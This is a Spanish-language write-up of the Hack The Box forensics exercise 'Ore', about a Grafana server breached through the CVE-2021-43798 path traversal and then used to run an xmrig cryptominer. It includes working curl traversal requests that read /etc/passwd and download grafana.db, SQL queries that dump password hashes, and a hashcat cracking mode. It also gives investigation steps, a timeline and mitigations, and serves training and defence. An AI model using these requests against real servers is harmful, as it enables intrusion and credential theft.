---
sherlock: Ore
difficulty: Medium
category: DFIR
platform: Hack The Box
state: Unverified
tags: [dfir, linux, grafana, cve-2021-43798, path-traversal, cryptominer, xmrig]
---

# Ore — Hack The Box Sherlock

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Pendiente de confirmar en HTB sin sesión; ficha de referencia no jugada.
> Sin flags, credenciales, direcciones de wallet ni IPs reales.

## TL;DR

Un servidor con **Grafana 8.0.2** es vulnerable a **CVE-2021-43798**, un path traversal en el endpoint de plugins. El atacante lee `/etc/passwd` y la base de datos `grafana.db`, obtiene credenciales y accede al panel. Después despliega un minero (`xmrig`) y deja persistencia. La investigación combina logs de Grafana, procesos, cron/systemd y tráfico de red.

## Reconocimiento

```bash
nmap -Pn -sCV -p 3000,22 <TARGET_IP>
curl -s http://<TARGET_IP>:3000/api/health
```

La versión se confirma en `/api/health` o en el pie del login. Si es 8.0.2 (o cualquier 8.x anterior a 8.3.1), el traversal está presente.

## 1. Path traversal

```bash
curl --path-as-is \
  'http://<TARGET_IP>:3000/public/plugins/alertlist/../../../../../../etc/passwd'
```

El endpoint no normaliza `..` y permite salir del directorio de plugins. Para leer la base de datos:

```bash
curl --path-as-is \
  'http://<TARGET_IP>:3000/public/plugins/alertlist/../../../../../../var/lib/grafana/grafana.db' \
  -o grafana.db
file grafana.db
```

Rutas habituales: `/var/lib/grafana/grafana.db`, `/etc/grafana/grafana.ini`, `/var/lib/grafana/plugins/`. También se puede leer la clave de firma de sesión si está en el `.ini`.

## 2. Credenciales

```bash
sqlite3 grafana.db '.tables'
sqlite3 grafana.db 'select id,login,password,salt,is_admin from user;'
```

Grafana almacena `PBKDF2-HMAC-SHA256(password, salt, 10000)`. Se crackea offline con hashcat modo `10900` y un diccionario; no se publican hashes ni contraseñas.

Con una cuenta admin se accede al panel y se revisan:

- `Data sources` con credenciales de bases de datos.
- `API keys` y usuarios creados.
- Paneles y anotaciones con comandos o URLs.
- `Server admin` → `Settings` para leer configuración.

## 3. Acceso y persistencia

```bash
ssh <USER>@<TARGET_IP>
ps auxww | grep -iE 'xmrig|miner|catscale'
crontab -l
systemctl list-units --type=service --state=running
```

- `xmrig` suele ejecutarse desde `/tmp`, `/dev/shm` o una carpeta de usuario, con `--donate-level 1` y una pool externa.
- Se revisan `~/.bashrc`, `~/.profile`, `/etc/cron.*`, `systemd` y `authorized_keys`.
- `CatScale` es el nombre asociado al despliegue observado en el caso; se documenta como artefacto, sin inventar su función.

## 4. Red

```bash
ss -tupna
grep -RInE 'stratum|pool|wallet' /etc /var/lib/grafana 2>/dev/null
```

Se anota la pool como `<POOL_HOST>:<PORT>` y la wallet como `<WALLET>`; no se copian valores reales. El patrón de conexión y el proceso son la evidencia, no la dirección.

## 5. Línea temporal

| Hora (UTC) | Evento |
|---|---|
| T0 | Petición a `/public/plugins/alertlist/../../..` |
| T0+1m | Lectura de `grafana.db` |
| T0+5m | Login con cuenta admin |
| T0+10m | Descarga de `xmrig` |
| T0+12m | Persistencia en cron/systemd |
| T0+15m | Conexión a la pool |

## Lecciones aprendidas

- Grafana expone mucha información en su base SQLite; el traversal convierte un fallo de lectura en compromiso total.
- La versión debe comprobarse antes de asumir el CVE.
- Un minero se detecta por CPU, proceso y conexión a pool, no solo por el nombre.
- La persistencia en Linux suele estar en cron, systemd, `.bashrc` y claves SSH.
- No se publican wallets ni credenciales: son datos de terceros.

## Mitigaciones y detección

- Actualizar Grafana a una versión corregida (8.3.1 o superior de la rama soportada).
- Restringir `/public/plugins/` y normalizar rutas en el proxy.
- Alertar de peticiones con `..` a `/public/plugins/`, lecturas de `grafana.db` y procesos con CPU alta.
- Monitorizar conexiones a pools de minería y servicios systemd nuevos.
- Rotar credenciales de Grafana y de las fuentes de datos; revisar API keys.

MITRE: T1190, T1003, T1496, T1053.003.

## Referencias

- <https://nvd.nist.gov/vuln/detail/CVE-2021-43798>
- <https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/>
- <https://mwalkowski.com/post/sherlock-ore>
